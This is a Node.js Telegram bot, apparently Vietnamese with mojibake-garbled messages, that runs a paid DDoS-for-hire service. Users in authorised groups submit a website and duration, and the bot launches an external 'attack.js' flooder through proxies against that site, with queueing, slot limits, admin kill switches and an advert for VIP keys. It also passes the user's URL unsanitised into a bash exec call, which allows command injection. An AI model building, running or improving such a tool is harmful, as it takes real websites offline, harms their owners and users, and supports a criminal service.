const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const fs = require('fs');

const adminIdFile = 'adminid1.txt', allowedGroupIdsFile = 'groupid.txt', blacklistFile = 'blacklist.txt', tokenFile = 'token1.txt';
let token, adminIds = new Set(), allowedGroupIds = new Set(), blacklist = [], botActive = true;
let currentProcesses = 0, queue = [], userProcesses = {}, activeAttacks = {}, botStartTime = Date.now();

// Load token, admin IDs, group IDs, and blacklist from files
const loadConfig = () => {
    try {
        if (!fs.existsSync(tokenFile)) throw new Error('‚ùå File token.txt kh√¥ng t·ªìn t·∫°i.');
        token = fs.readFileSync(tokenFile, 'utf8').trim();
        if (!token) throw new Error('‚ùå Token kh√¥ng h·ª£p l·ªá.');

        if (fs.existsSync(adminIdFile)) adminIds = new Set(fs.readFileSync(adminIdFile, 'utf8').split('\n').filter(id => id.trim()));
        if (fs.existsSync(allowedGroupIdsFile)) allowedGroupIds = new Set(fs.readFileSync(allowedGroupIdsFile, 'utf8').split('\n').filter(id => id.trim()));
        if (fs.existsSync(blacklistFile)) blacklist = fs.readFileSync(blacklistFile, 'utf8').split('\n').filter(url => url.trim());

        if (adminIds.size === 0) console.warn('‚ö†Ô∏è File adminid.txt tr·ªëng ho·∫∑c kh√¥ng t·ªìn t·∫°i.');
        if (allowedGroupIds.size === 0) console.warn('‚ö†Ô∏è File groupid.txt tr·ªëng ho·∫∑c kh√¥ng t·ªìn t·∫°i.');
        if (blacklist.length === 0) console.warn('‚ö†Ô∏è File blacklist.txt tr·ªëng ho·∫∑c kh√¥ng t·ªìn t·∫°i.');
    } catch (err) {
        console.error(err.message);
        process.exit(1);
    }
};

loadConfig();
const bot = new TelegramBot(token, { polling: true });

const maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 300;
const helpMessage = `üìú H∆∞·ªõng d·∫´n s·ª≠ d·ª•ng:
‚ûî L·ªánh ch√≠nh x√°c: <code>https://example.com 120</code>
‚ö†Ô∏è L∆∞u √Ω: Th·ªùi gian t·ªëi ƒëa l√† ${maxTimeAttacks} gi√¢y.

üîê Quy·ªÅn h·∫°n:
- Admin: C√≥ th·ªÉ ch·ªâ ƒë·ªãnh th·ªùi gian t√πy √Ω (t·ªëi ƒëa ${maxTimeAttacks} gi√¢y), s·ª≠ d·ª•ng l·ªánh <code>/pkill</code>, <code>/on</code>, <code>/off</code>.
- Ng∆∞·ªùi d√πng th∆∞·ªùng: Th·ªùi gian t·ªëi ƒëa 120 gi√¢y, kh√¥ng th·ªÉ s·ª≠ d·ª•ng l·ªánh admin.

üí≥ Mua Key VIP Ng√†y/Tu·∫ßn/Th√°ng li√™n h·ªá @adam022022.`;

const sendHelp = (chatId, caller) => bot.sendMessage(chatId, `${caller ? `@${caller} ` : ''}${helpMessage}`, { parse_mode: 'HTML' });

const initBot = () => {
    bot.on('message', async msg => {
        const { chat: { id: chatId }, text, from: { id: userId, username, first_name }, date } = msg;
        const isAdmin = adminIds.has(userId.toString()), isGroup = allowedGroupIds.has(chatId.toString()), caller = username || first_name;

        if (date * 1000 < botStartTime) return;
        if (!isGroup) return bot.sendMessage(chatId, '‚ùå Bot ch·ªâ ho·∫°t ƒë·ªông trong nh√≥m ƒë∆∞·ª£c c·∫•p ph√©p. Contact: @adam022022.', { parse_mode: 'HTML' });
        if (!text) return;

        if (text === '/help') return sendHelp(chatId, caller);

        if (text.startsWith('http')) {
            if (!botActive) return bot.sendMessage(chatId, '‚ùå Bot hi·ªán ƒëang t·∫Øt. Ch·ªâ admin c√≥ th·ªÉ b·∫≠t l·∫°i.', { parse_mode: 'HTML' });

            const [host, time, full] = text.split(' ');
            if (!host || isNaN(time)) return bot.sendMessage(chatId, 'üö´ Sai ƒë·ªãnh d·∫°ng! Nh·∫≠p theo: <code>https://example.com 120</code>.', { parse_mode: 'HTML' });

            // Ki·ªÉm tra blacklist
            const isBlacklisted = blacklist.some(blackUrl => host.includes(blackUrl));
            if (isBlacklisted) return bot.sendMessage(chatId, '‚ùå Link n√†y ƒë√£ b·ªã ch·∫∑n ·ªü blacklist kh√¥ng th·ªÉ th·ª±c hi·ªán l·ªánh.', { parse_mode: 'HTML' });

            let attackTime = parseInt(time, 10);
            if (isAdmin) attackTime = Math.min(attackTime, maxTimeAttacks);
            else attackTime = Math.min(attackTime, 120);

            if (userProcesses[userId] >= maxSlot) return bot.sendMessage(chatId, `‚ùå B·∫°n ƒë√£ ƒë·∫°t gi·ªõi h·∫°n s·ªë l∆∞·ª£ng ti·∫øn tr√¨nh (${maxSlot}).`);
            if (currentProcesses >= maxCurrent) {
                queue.push({ userId, host, time: attackTime, chatId, caller });
                return bot.sendMessage(chatId, '‚è≥ Y√™u c·∫ßu ƒë∆∞·ª£c ƒë∆∞a v√†o h√†ng ƒë·ª£i...', { parse_mode: 'HTML' });
            }

            const pid = Math.floor(Math.random() * 10000), endTime = Date.now() + attackTime * 1000;
            activeAttacks[pid] = { userId, endTime };
            userProcesses[userId] = (userProcesses[userId] || 0) + 1;
            currentProcesses++;

            const methods = full === 'full' && isAdmin ? ['GET', 'POST', 'HEAD'] : ['GET'];
            const startMessage = JSON.stringify({
                Status: "‚ú®üöÄüõ∏ Successfully üõ∏üöÄ‚ú®",
                Caller: caller,
                "PID Attack": pid,
                Website: host,
                Time: `${attackTime} Gi√¢y`,
                Maxslot: maxSlot,
                Maxtime: maxTimeAttacks,
                Methods: methods.join(' '),
                ConcurrentAttacks: currentProcesses,
                StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })
            }, null, 2);

            await bot.sendMessage(chatId, startMessage, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'üîç Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'üåê Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });

            let completedMethods = 0;
            methods.forEach(method => {
                exec(`node --max-old-space-size=8192 ./attack.js -m ${method} -u ${host} -p live.txt --full true -s ${attackTime}`, { shell: '/bin/bash' }, (e, stdout, stderr) => {
                    completedMethods++;
                    if (completedMethods === methods.length) {
                        const completeMessage = JSON.stringify({ Status: "üëΩ END ATTACK üëΩ", Caller: caller, "PID Attack": pid, Website: host, Methods: methods.join(' '), Time: `${attackTime} Gi√¢y`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
                        bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
                        delete activeAttacks[pid];
                        userProcesses[userId]--;
                        currentProcesses--;

                        if (queue.length) {
                            const next = queue.shift();
                            bot.sendMessage(next.chatId, `üì• Kh·ªüi ƒë·ªông t·ª´ h√†ng ƒë·ª£i: ${next.host} ${next.time}s`);
                            bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
                        }
                    }
                });
            });
            return;
        }

        if (text.startsWith('/pkill') || text.startsWith('/on') || text.startsWith('/off')) {
            if (!isAdmin) return bot.sendMessage(chatId, '‚ùå B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c thi l·ªánh admin. Contact: @adam022022', { parse_mode: 'HTML' });

            if (text.startsWith('/pkill')) {
                exec('pgrep -f attack.js', (e, stdout, stderr) => {
                    if (e || !stdout.trim()) return bot.sendMessage(chatId, '‚ùå Kh√¥ng t√¨m th·∫•y ti·∫øn tr√¨nh ƒëang ch·∫°y.', { parse_mode: 'HTML' });

                    const pids = stdout.trim().split('\n').join(', ');
                    exec(`pkill -f -9 attack.js`, (e, stdout, stderr) => {
                        if (e) return bot.sendMessage(chatId, '‚ùå L·ªói khi th·ª±c hi·ªán pkill.', { parse_mode: 'HTML' });
                        bot.sendMessage(chatId, `‚úÖ ƒê√£ kill ho√†n to√†n ti·∫øn tr√¨nh. PID: ${pids}`, { parse_mode: 'HTML' });
                    });
                });
                return;
            }

            if (text.startsWith('/on')) {
                botActive = true;
                bot.sendMessage(chatId, '‚úÖ Bot ƒë√£ ƒë∆∞·ª£c b·∫≠t.', { parse_mode: 'HTML' });
                return;
            }

            if (text.startsWith('/off')) {
                botActive = false;
                bot.sendMessage(chatId, '‚úÖ Bot ƒë√£ ƒë∆∞·ª£c t·∫Øt.', { parse_mode: 'HTML' });
                return;
            }
        }
    });
};

initBot();
